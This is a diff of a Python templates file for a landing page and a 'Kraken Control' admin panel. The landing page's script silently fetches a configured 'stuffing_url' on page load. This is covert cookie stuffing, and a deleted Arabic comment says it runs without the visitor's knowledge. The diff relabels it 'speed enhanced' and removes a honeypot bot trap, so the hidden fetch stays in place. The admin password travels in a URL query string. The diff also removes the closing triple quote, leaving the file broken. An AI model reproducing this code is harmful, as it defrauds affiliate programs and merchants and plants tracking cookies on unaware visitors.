@@ -1,6 +1,7 @@
 # templates.py
+# نسخة: تسريع الكوكيز فقط (بدون حظر بوتات)
 
-# --- 1. User Landing Page (With Honeypot + Silent Prefetching) ---
+# --- 1. User Landing Page (Speed Enhanced) ---
 LANDING_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -25,8 +26,6 @@ LANDING_HTML = """
     </style>
 </head>
 <body class="min-h-screen">
-
-    <a href="/secret-system-check" style="display:none; visibility:hidden;" aria-hidden="true" rel="nofollow">System Check</a>
 
     <div class="max-w-2xl mx-auto bg-white min-h-screen shadow-xl border-x border-slate-100">
         
@@ -91,9 +90,8 @@ LANDING_HTML = """
         let isTimerDone = false;
         let hasScrolled = false;
 
-        // ⚡ EXECUTE SECRET PRE-FETCH ON LOAD
+        // ⚡ EXECUTE PRE-FETCH ON LOAD (تسريع الكوكيز)
         window.onload = function() {
-            // نقوم بطلب رابط الكوكيز في الخلفية بدون علم الزائر
             if("{{ s.stuffing_url }}" !== "") {
                 const prefetchLink = "/redirect?url=" + encodeURIComponent("{{ s.stuffing_url }}");
                 fetch(prefetchLink, { mode: 'no-cors' }).catch(() => {});
@@ -157,7 +155,7 @@ LANDING_HTML = """
 </html>
 """
 
-# --- 2. Admin Dashboard (Same as before) ---
+# --- 2. Admin Dashboard (Clean Version - No Ban Stats) ---
 ADMIN_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -173,11 +171,10 @@ ADMIN_HTML = """
         <header class="bg-white p-6 rounded-[2rem] shadow-sm border border-slate-100 mb-6 flex justify-between items-center">
             <div>
                 <h1 class="text-xl font-black text-blue-600 tracking-tighter uppercase">Kraken Control</h1>
-                <span class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Honeypot & Prefetch Active 🛡️⚡</span>
+                <span class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Speed Boost Active ⚡</span>
             </div>
             <div class="flex items-center gap-3">
-                <span class="bg-red-50 text-red-600 text-[10px] font-black px-4 py-2 rounded-full border border-red-100">BANNED BOTS: {{ banned_count }}</span>
-                <span class="bg-blue-50 text-blue-600 text-[10px] font-black px-4 py-2 rounded-full border border-blue-100">STABLE v5.1</span>
+                <span class="bg-blue-50 text-blue-600 text-[10px] font-black px-4 py-2 rounded-full border border-blue-100">STABLE v5</span>
             </div>
         </header>
 
@@ -229,10 +226,7 @@ ADMIN_HTML = """
         </div>
 
         <div class="space-y-4 pb-20">
-            <div class="flex justify-between items-center px-2">
-                <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest">Active Assets</h2>
-                <a href="/admin/clear_bans?pw={{ admin_password }}" class="text-[9px] text-slate-300 hover:text-red-500 font-bold">RESET BANS</a>
-            </div>
+            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest px-2">Active Assets</h2>
             {% for link in links %}
             <div class="bg-white p-6 rounded-[2.5rem] shadow-sm border border-slate-100">
                 <div class="flex justify-between items-center mb-4">
@@ -263,4 +257,3 @@ ADMIN_HTML = """
     </script>
 </body>
 </html>
-"""
